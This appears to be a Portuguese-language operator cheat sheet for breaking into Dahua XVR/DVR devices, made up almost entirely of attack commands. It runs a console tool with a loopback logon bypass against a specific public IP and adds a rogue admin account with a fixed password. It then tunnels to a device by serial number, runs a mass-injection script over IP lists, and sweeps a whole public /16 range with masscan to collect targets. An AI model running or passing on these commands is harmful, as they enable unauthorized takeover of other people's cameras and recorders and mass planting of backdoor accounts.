e roda, pra ver se conecta no console

/Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

Dahua product:"Dahua XVR" version:"3.218.0000001.4"

python3 Console.py --proto dhip --rport 80 --logon loopback --rhost 101.190.9.204

usermgr add pdr Senha@2026 admin

python3 Console.py --proto dhip --rport 8080 --logon loopback --rhost 127.0.0.1

./target/release/dh-p2p 3K04BD5PAG00028 -p 127.0.0.1:8080:80 --relay

.
.
.
.
.


Modo Massa: python3 dh.py -f ips.txt -p 80 -u admin -P Senha@2026
Modo Manual: python3 dh.py -i 192.168.0.15 -p 37777
Modo Interativo: python3 dh.py
Pega uma lista de ips do arquivo, e tenta injetar: python3 dh.py -f ips.txt -p 80 -u usr ou pdr -P Senha@2026


.
.
.
.
.
.


criando tunel com dh-p2p, e rodando (vai mais rápido)  

python3 dh.py -i 127.0.0.1 -p 8080


.
.
.
.
.
.

comando dvr2: 

python3 dh.py -f ips37777.txt -u pdr -P Senha@2026 -t 250

sudo masscan -p 37777 125.24.0.0-125.24.255.254 --rate 5000 -oL /home/ubuntu/DahuaConsole/ips37777.txt -e ens5

grep -E 'tcp (37776|37777|37778)' ips37777.txt | awk '{print $4}'

